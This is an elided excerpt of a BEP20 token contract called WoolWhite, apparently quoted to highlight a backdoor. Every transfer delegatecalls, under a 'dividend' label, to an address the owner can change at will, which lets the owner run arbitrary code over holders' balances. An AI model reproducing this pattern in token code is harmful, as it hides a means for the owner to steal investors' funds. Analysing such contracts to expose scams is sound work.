...
contract WoolWhite is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'WoolWhite';
  string private constant _symbol = 'WOOW';
  ...
  */
  ...
  function claimDividendWOOW(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_WOOW.delegatecall(
  ...
  function SetBonusWOOW(address c) public onlyOwner {
    C_WOOW = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendWOOW(sender, recipient, amount);   
